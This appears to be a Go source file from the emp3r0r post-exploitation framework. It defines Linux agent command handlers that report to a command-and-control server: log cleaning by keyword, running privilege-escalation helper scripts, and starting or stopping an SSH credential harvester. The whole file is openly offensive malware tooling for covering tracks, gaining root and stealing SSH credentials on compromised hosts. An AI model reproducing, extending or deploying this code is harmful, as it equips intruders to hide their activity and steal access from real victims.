//go:build linux
// +build linux

package handler

import (
	"encoding/hex"
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// runGetRootLinux implements: !get_root
func runGetRootLinux(cmd *cobra.Command, args []string) {
	if os.Geteuid() == 0 {
		c2transport.NotifyC2(cmd, "%s", "Warning: You already have root!")
	} else {
		c2transport.NotifyC2(cmd, "%s", "Deprecated")
	}
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", "Done")
}

// runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
func runLPELinux(cmd *cobra.Command, args []string) {
	scriptName, _ := cmd.Flags().GetString("script_name")
	checksum, _ := cmd.Flags().GetString("checksum")
	if scriptName == "" || checksum == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}
	out := modules.RunLPEHelper(scriptName, checksum)
	c2transport.NotifyC2(cmd, "%s", out)
}

// runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
	codePattern, _ := cmd.Flags().GetString("code_pattern")
	regName, _ := cmd.Flags().GetString("reg_name")
	stop, _ := cmd.Flags().GetBool("stop")
	if stop && modules.SshHarvesterCancel != nil {
		modules.SshHarvesterCancel()
		c2transport.NotifyC2(cmd, "%s", "SSH harvester stopped")
		return
	}
	codePatternBytes, err := hex.DecodeString(codePattern)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
		return
	}
	if modules.SshHarvesterRunning {
		c2transport.NotifyC2(cmd, "%s", "SSH harvester is already running")
	} else {
		go modules.SshHarvester(cmd, codePatternBytes, regName)
	}
}
